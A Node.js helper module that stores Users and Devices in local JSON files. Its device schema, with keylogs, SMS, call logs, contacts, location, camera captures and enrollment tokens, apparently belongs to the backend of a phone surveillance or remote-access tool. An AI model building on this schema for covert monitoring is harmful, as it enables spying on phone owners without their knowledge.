/**
 * db.js — Tiny JSON file-based database helper
 * Replaces MongoDB/Mongoose with zero external dependencies.
 * Each collection is a plain JSON file in server/db/
 */

const fs   = require("fs");
const path = require("path");

const DB_DIR = path.join(__dirname, "../db");

/** Read a collection JSON file and return parsed array */
function readCollection(name) {
  const file = path.join(DB_DIR, `${name}.json`);
  if (!fs.existsSync(file)) return [];
  return JSON.parse(fs.readFileSync(file, "utf8"));
}

/** Write an array back to the collection JSON file */
function writeCollection(name, data) {
  const file = path.join(DB_DIR, `${name}.json`);
  fs.writeFileSync(file, JSON.stringify(data, null, 2), "utf8");
}

/** Generate a simple unique ID */
function newId() {
  return Date.now().toString(36) + Math.random().toString(36).slice(2, 7);
}

// ── Users ─────────────────────────────────────────────────────────────────────

const Users = {
  findOne(predicate) {
    return readCollection("users").find(predicate) || null;
  },
  create(doc) {
    const users = readCollection("users");
    const newDoc = { _id: newId(), ...doc };
    users.push(newDoc);
    writeCollection("users", users);
    return newDoc;
  }
};

// ── Devices ───────────────────────────────────────────────────────────────────

const Devices = {
  find() {
    return [...readCollection("devices")].sort(
      (a, b) => new Date(b.createdAt) - new Date(a.createdAt)
    );
  },
  findById(id) {
    return readCollection("devices").find(d => d._id === id) || null;
  },
  findByToken(token) {
    return readCollection("devices").find(d => d.enrollToken === token) || null;
  },
  create(doc) {
    const devices = readCollection("devices");
    const now = new Date().toISOString();
    const newDoc = {
      _id: newId(),
      imei: "", name: "Unknown Device", phone: "", email: "",
      comments: "", lastOnline: "", ip: "", model: "", os: "", battery: "",
      contacts: [], callLogs: [], sms: [], location: [], apps: [],
      files: [], keylogs: [], iplogs: [], camera: [], wifiLogs: [],
      createdAt: now, updatedAt: now,
      ...doc
    };
    devices.push(newDoc);
    writeCollection("devices", devices);
    return newDoc;
  },
  findByIdAndUpdate(id, updates) {
    const devices = readCollection("devices");
    const idx = devices.findIndex(d => d._id === id);
    if (idx === -1) return null;
    devices[idx] = { ...devices[idx], ...updates, updatedAt: new Date().toISOString() };
    writeCollection("devices", devices);
    return devices[idx];
  },
  findByIdAndPush(id, field, data) {
    const devices = readCollection("devices");
    const idx = devices.findIndex(d => d._id === id);
    if (idx === -1) return null;
    if (!Array.isArray(devices[idx][field])) devices[idx][field] = [];
    devices[idx][field].push(data);
    devices[idx].updatedAt = new Date().toISOString();
    writeCollection("devices", devices);
    return devices[idx];
  },
  findByIdAndDelete(id) {
    const devices = readCollection("devices");
    const idx = devices.findIndex(d => d._id === id);
    if (idx === -1) return null;
    const [deleted] = devices.splice(idx, 1);
    writeCollection("devices", devices);
    return deleted;
  }
};

module.exports = { Users, Devices };